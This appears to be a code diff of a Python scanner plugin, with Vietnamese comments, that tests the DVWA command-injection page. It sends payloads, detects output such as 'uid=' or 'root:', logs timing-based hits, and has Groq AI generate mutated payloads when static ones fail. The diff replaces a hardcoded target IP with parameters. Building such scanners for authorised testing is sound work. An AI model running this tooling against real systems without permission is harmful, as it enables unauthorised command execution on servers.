@@ -13,7 +13,6 @@ from ai_self_validation import groq_generate_payloads, groq_evaluate_results
 
 class DVWACMDiPlugin(BasePlugin):
     def __init__(self):
-        # Khởi tạo hai nền tảng cốt lõi của Level 3 Agent
         self.logger = InteractionLogger()
         self.engine = ConfidenceEngine()
 
@@ -30,7 +29,7 @@ class DVWACMDiPlugin(BasePlugin):
     def match(self, service_info: Dict[str, Any]) -> bool:
         return service_info.get("service", "") in ["http", "https"]
 
-    def _send_payload(self, url, payload, cookie):
+    def _send_payload(self, url, target_ip, target_port, payload, cookie):
         """Gửi payload, xử lý Timeout thông minh, lọc sạch rác Ping và lưu Telemetry"""
         try:
             data = urllib.parse.urlencode({"ip": payload, "Submit": "Submit"}).encode()
@@ -46,7 +45,7 @@ class DVWACMDiPlugin(BasePlugin):
             cmd_output = re.search(r'<pre>(.*?)</pre>', body, re.DOTALL)
             output = cmd_output.group(1).strip() if cmd_output else ""
             
-            # BẢO TOÀN NGUYÊN VẸN LOGIC LỌC RÁC PING CŨ CỦA BẠN (DVWA PROTECTION)
+            # Logic lọc rác ping bảo toàn từ hệ thống cũ
             clean_lines = []
             garbage_keywords = ["PING ", "bytes from ", "ping statistics", "packets transmitted", "rtt min", "round-trip"]
             for line in output.split('\n'):
@@ -56,13 +55,11 @@ class DVWACMDiPlugin(BasePlugin):
                     clean_lines.append(line.strip())
             
             output = '\n'.join(clean_lines)
-            
-            # Khớp chữ ký sinh học hệ thống để xác nhận HIT
             marker_hit = any(m in output for m in ["uid=", "www-data", "root:", "Windows IP Configuration"])
 
-            # Đẩy phiên truyền thông thô vào SQLite Database tập trung
+            # Đẩy phiên truyền thông thô vào SQLite Database tập trung bằng tham số động
             self.logger.log_transaction(
-                plugin_id=self.METADATA["id"], target_ip="13.229.112.6", target_port=80,
+                plugin_id=self.METADATA["id"], target_ip=target_ip, target_port=target_port,
                 url=url, method="POST", payload=payload, req_headers={"Cookie": cookie},
                 res_status=res_status, res_headers={}, res_body=output, latency=elapsed, marker_hit=marker_hit
             )
@@ -71,9 +68,8 @@ class DVWACMDiPlugin(BasePlugin):
             
         except urllib.error.URLError as e:
             if isinstance(e.reason, socket.timeout):
-                # Ghi nhận Blind Timing attack khi sleep thành công
                 self.logger.log_transaction(
-                    plugin_id=self.METADATA["id"], target_ip="13.229.112.6", target_port=80,
+                    plugin_id=self.METADATA["id"], target_ip=target_ip, target_port=target_port,
                     url=url, method="POST", payload=payload, req_headers={"Cookie": cookie},
                     res_status=200, res_headers={}, res_body="[SYSTEM_TIMEOUT]", latency=5.0, marker_hit=True
                 )
@@ -84,7 +80,7 @@ class DVWACMDiPlugin(BasePlugin):
             return {"output": "", "response_time": -1, "hit": False, "error": str(e)}
         except socket.timeout:
             self.logger.log_transaction(
-                plugin_id=self.METADATA["id"], target_ip="13.229.112.6", target_port=80,
+                plugin_id=self.METADATA["id"], target_ip=target_ip, target_port=target_port,
                 url=url, method="POST", payload=payload, req_headers={"Cookie": cookie},
                 res_status=200, res_headers={}, res_body="[SYSTEM_TIMEOUT]", latency=5.0, marker_hit=True
             )
@@ -98,7 +94,7 @@ class DVWACMDiPlugin(BasePlugin):
     def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
         cookie = context.get("session_cookie", "")
         if not cookie:
-            return {"status": "PENDING", "evidence": "Chưa có session cookie"}
+            return {"status": "PENDING", "evidence": "Thành phần shared_context thiếu session_cookie."}
 
         url = f"http://{target_ip}:{target_port}/vulnerabilities/exec/"
         all_results = []
@@ -113,7 +109,7 @@ class DVWACMDiPlugin(BasePlugin):
         initial_confirmed = None
         for payload, technique in initial_payloads:
             print(f"      [CMDi] [{technique}] Payload: {payload}")
-            result = self._send_payload(url, payload, cookie)
+            result = self._send_payload(url, target_ip, target_port, payload, cookie)
             
             all_results.append({
                 "phase": "initial", "technique": technique, "payload": payload,
@@ -122,7 +118,6 @@ class DVWACMDiPlugin(BasePlugin):
             if result["hit"] and not initial_confirmed:
                 initial_confirmed = {"payload": payload, "output": result["output"], "technique": technique}
 
-        # KÍCH HOẠT ĐỘT BIẾN AI NẾU PHẦN CỨNG BỊ KHÓA (Giải quyết Problem A từ file yêu cầu)
         if not initial_confirmed:
             print(f"\n      [!] CMDi KB MISS. Kích hoạt AI Groq phân tích và đột biến chiến thuật...")
             telemetry_data = self.logger.get_plugin_telemetry(self.METADATA["id"])
@@ -133,7 +128,7 @@ class DVWACMDiPlugin(BasePlugin):
             for p in test_payloads:
                 payload, purpose = p.get("payload", ""), p.get("purpose", "")
                 print(f"      [CMDi] [AI Test] Payload: {payload} | Mục đích: {purpose}")
-                result = self._send_payload(url, payload, cookie)
+                result = self._send_payload(url, target_ip, target_port, payload, cookie)
                 
                 all_results.append({
                     "phase": "ai_test", "purpose": purpose, "payload": payload,
@@ -145,7 +140,6 @@ class DVWACMDiPlugin(BasePlugin):
         if not initial_confirmed:
             return {"status": "FALSE_POSITIVE", "evidence": "Toàn bộ chuỗi payload tĩnh và đột biến thích ứng đều thất bại."}
 
-        # Gọi AI Evaluator để trích xuất ngữ nghĩa (Semantic Analysis)
         print(f"\n      [CMDi] PHASE 3: Kích hoạt Confidence Engine chấm điểm số học đa chiều...")
         ai_verdict = "CONFIRMED"
         ai_reasoning = "Xác nhận thực thi lệnh tùy ý dựa trên dấu vết hệ thống phản hồi."
@@ -156,7 +150,6 @@ class DVWACMDiPlugin(BasePlugin):
         except Exception:
             pass
 
-        # Thực hiện thuật toán định lượng toán học đa chiều
         telemetry_summary = self.logger.get_plugin_telemetry(self.METADATA["id"])
         decision = self.engine.calculate_score(
             rule_passed=True,
